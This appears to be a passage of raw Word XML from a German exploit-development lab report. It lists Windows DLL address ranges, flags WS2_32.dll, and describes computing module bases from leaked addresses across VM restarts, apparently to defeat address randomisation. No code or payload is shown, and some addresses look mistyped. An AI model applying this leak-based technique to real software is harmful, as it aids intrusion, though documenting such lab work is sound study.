                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77950000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1984" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="01EB7A89" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>779f2000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="440530E6" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Nein</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00347316" w:rsidRPr="00B47CB9" w14:paraId="264213D3" w14:textId="77777777" w:rsidTr="00347316">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0FA0FCAD" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>IMMA32.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2E0A24AF" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>76ee0000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1984" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="562E0B04" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>76eff000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4B01FC8A" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Nein</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00347316" w:rsidRPr="00B47CB9" w14:paraId="6EB4CB40" w14:textId="77777777" w:rsidTr="00347316">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4FFF4963" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>NSI.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0FAF3C9A" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77b70000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1984" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="50B4870F" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77b76000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0AA4C8B7" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Nein</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00347316" w:rsidRPr="00B47CB9" w14:paraId="310D54B5" w14:textId="77777777" w:rsidTr="00347316">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="28E64DFD" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>MSCTF.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="264AA094" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>76f60000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1984" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="17FF140D" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>7702c000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="33431F1C" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Nein</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00347316" w:rsidRPr="00B47CB9" w14:paraId="410D1B26" w14:textId="77777777" w:rsidTr="00347316">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="67776DEE" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Kernelbase.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6BC13CEB" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>75cc0000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1984" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6F4AEE11" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>75d0b000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="021A2BC0" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Nein</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00347316" w:rsidRPr="00B47CB9" w14:paraId="2AF71237" w14:textId="77777777" w:rsidTr="00347316">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2ED755B4" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>GDI32.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="15FF9D28" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>76f10000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1984" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0A3CB4F1" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>76f5e000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="61CA5A4C" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Nein</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00347316" w:rsidRPr="00B47CB9" w14:paraId="20D92226" w14:textId="77777777" w:rsidTr="00347316">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6382A471" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>ADVAPI32.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="25EB6270" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>7725000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1984" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="522C1EEE" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>772f1000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="28535B0F" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Nein</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00347316" w:rsidRPr="00B47CB9" w14:paraId="1E32C716" w14:textId="77777777" w:rsidTr="00347316">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="44FFD22A" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>WS2_32.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="252E5E3D" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>75f50000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1984" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7EE220D9" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>75f85000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2E697178" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:highlight w:val="green"/>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Ja</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00347316" w:rsidRPr="00B47CB9" w14:paraId="0020C69A" w14:textId="77777777" w:rsidTr="00347316">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1D0C5D34" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>MSWSOCK.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7E604EEE" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>75370000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1984" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4FC105C2" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>753ac000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0D6894CA" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Nein</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00347316" w:rsidRPr="00B47CB9" w14:paraId="282A741B" w14:textId="77777777" w:rsidTr="00347316">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2689" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="046FC4C9" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>User32.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4EDD0765" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77430000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1984" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="107194A2" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>774f90000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="23F5CF9D" w14:textId="77777777" w:rsidR="00347316" w:rsidRPr="00B47CB9" w:rsidRDefault="00347316" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Nein</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5DEFA61B" w14:textId="66B2277A" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00071E4E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BA1589F" w14:textId="03639F33" w:rsidR="009B5D62" w:rsidRPr="00B47CB9" w:rsidRDefault="009B5D62" w:rsidP="00071E4E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Außerdem wurde das Offset für bestimmte </w:t>
      </w:r>
      <w:r w:rsidR="00CF6FDE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Adressen</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> herausgerechnet, um mit Sicherheit feststellen zu können, dass </w:t>
      </w:r>
      <w:r w:rsidR="00CF6FDE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">die Adresse </w:t>
      </w:r>
      <w:r w:rsidR="00E73D91" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>zur späteren Berechnung der Base verwendet werden kann. Dieses wurde für</w:t>
      </w:r>
      <w:r w:rsidR="00C340CB" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00002580" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>jeweils eine Adresse einer geleakten DLL durchgeführt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AC0D153" w14:textId="622B4A05" w:rsidR="00002580" w:rsidRPr="00B47CB9" w:rsidRDefault="00002580" w:rsidP="00071E4E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D3B5218" w14:textId="4821291B" w:rsidR="009B5D62" w:rsidRPr="00B47CB9" w:rsidRDefault="00002580" w:rsidP="00071E4E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Der Vorgang wurde mehrmals </w:t>
      </w:r>
      <w:r w:rsidR="00E13E1A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">nach dem Neustarten der Windows VM </w:t>
      </w:r>
      <w:r w:rsidR="007923DA" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">wiederholt, </w:t>
      </w:r>
      <w:r w:rsidR="00E13E1A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>ein zusätzliches Intervall</w:t>
      </w:r>
      <w:r w:rsidR="007923DA" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> wurde wie folgt </w:t>
      </w:r>
      <w:r w:rsidR="00E13E1A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidR="007923DA" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>okumentiert</w:t>
      </w:r>
      <w:r w:rsidR="00E13E1A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E3453FC" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00071E4E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3886F4F1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00071E4E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Mona Modules:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C6F87E9" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00071E4E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DBDBEA0" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00071E4E">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5449A24D" wp14:editId="27E44EF9">
            <wp:extent cx="5759450" cy="1802765"/>
            <wp:effectExtent l="0" t="0" r="0" b="698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59450" cy="1802765"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
